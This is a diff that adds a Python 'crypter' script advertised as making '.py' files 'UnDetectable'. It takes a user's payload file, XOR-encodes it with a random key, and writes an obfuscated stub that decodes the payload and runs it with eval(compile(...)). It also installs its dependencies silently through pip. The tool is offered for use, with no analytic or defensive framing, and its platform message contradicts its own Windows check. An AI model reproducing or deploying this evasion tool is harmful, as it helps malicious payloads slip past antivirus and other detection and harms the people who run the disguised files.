@@ -1,0 +1,117 @@
+import random
+from pathlib import Path
+import  platform
+import os
+import time
+try:
+    import requests
+except:
+    print("[*]Installing request Module")
+    os.system("pip install requests -q -q -q")
+try:
+    import termcolor
+except:
+    print("[*]Installing termcolor Module")
+    os.system("pip install termcolor -q -q -q")
+try:
+    from cryptlib import encstr
+except:
+    os.system("pip install cryptlib -q -q -q")
+def logo():
+    print(termcolor.colored('''****************************************************************************
+                ________   __     ____    __   __   _____    ______        *
+               / /  _ \ \ / /    / ___|_ _\ \ / / _|_   _|__|  _ \ \       *
+              | || |_) \ V /____| |   | '__\ V / '_ \| |/ _ \ |_) | |      *
+             < < |  __/ | |_____| |___| |   | || |_) | |  __/  _ < > >     *
+              | ||_|    |_|      \____|_|   |_|| .__/|_|\___|_| \_\ |      *
+               \_\                             |_|               /_/       *
+                   Python Crypter To Make Your Py Files UnDetectable       *
+                                                                           *
+                              Coded By: Machine1337                        *
+****************************************************************************
+  ''', 'cyan'))
+
+
+def catc():
+    try:
+        if platform.system().startswith("Windows"):
+            print("\033c")
+            logo()
+            check()
+        else:
+            print("\033c")
+            logo()
+            print(termcolor.colored("[*] Please Use Linux Based OS!",'red'))
+    except KeyboardInterrupt:
+        print()
+        print(termcolor.colored("\nYou Pressed The Exit Button!",'red'))
+        quit()
+
+
+def check():
+    path_to_file = 'stub.py'
+    path = Path(path_to_file)
+    if path.is_file():
+        print(termcolor.colored('[*]Crypted Old File Already Exists! Please Remove Or Rename It...','red'))
+        print()
+        print(termcolor.colored("""[1] For Remove File: Type:- del\n[2] For Rename File: Type:- ren """,'yellow'))
+        print()
+        a=input(termcolor.colored("[+]Do U Want To Remove Old File Or Rename File:- ",'blue'))
+        print()
+
+        if(a=="del"):
+            os.remove('stub.py')
+            time.sleep(2)
+            print(termcolor.colored("[*] File Successfully Deleted...",'green'))
+            print()
+            enc()
+        elif(a=="ren"):
+            os.rename('stub.py','old_stub.py')
+            time.sleep(2)
+            print(termcolor.colored("[*] File Successfully Renamed...", 'green'))
+            print()
+            enc()
+        else:
+            print(termcolor.colored("Plz! Remove or Rename It mannually",'red'))
+    else:
+        enc()
+def enc():
+    firstnum=input(termcolor.colored("[+] Enter Path Of Payload File:- ",'yellow'))
+    with open(firstnum) as f:
+        contents = f.read()
+    string = contents
+    a = 0
+    time.sleep(2)
+    print()
+    print(termcolor.colored("[*] File Validation Success...",'green'))
+    key = ""
+    while a < 100:
+        key = key + str(random.randint(0, 9))
+        a += 1
+
+    no_of_itr = len(string)
+    output_string = ""
+    for i in range(no_of_itr):
+        current_string = string[i]
+        current_key = key[i % len(key)]
+        output_string += chr(ord(current_string) ^ ord(current_key))
+    c=repr(output_string)
+    time.sleep(2)
+    print()
+    
+    print(termcolor.colored("[*] File Encryption Started...:-",'magenta'))
+    d=c.replace("'","")
+    time.sleep(2)
+    print()
+    print(termcolor.colored("[*] Generating Encryption Key...",'blue'))
+    try:
+        with open('stub.py', 'w') as f:
+            f.write(f"wopvEaTEcopFEavc =\"{d}\" \n")
+            f.write(f"\niOpvEoeaaeavocp = \"{key}\"\n")
+            f.write("uocpEAtacovpe = len(wopvEaTEcopFEavc)\noIoeaTEAcvpae = \"\"\nfor fapcEaocva in range(uocpEAtacovpe):\n    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]\n    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]\n    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\n\n\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))")
+    except FileNotFoundError:
+        print("")
+    time.sleep(2)
+    print()
+    print(termcolor.colored("[+] File Successfully Encrypted...",'green'))
+catc()
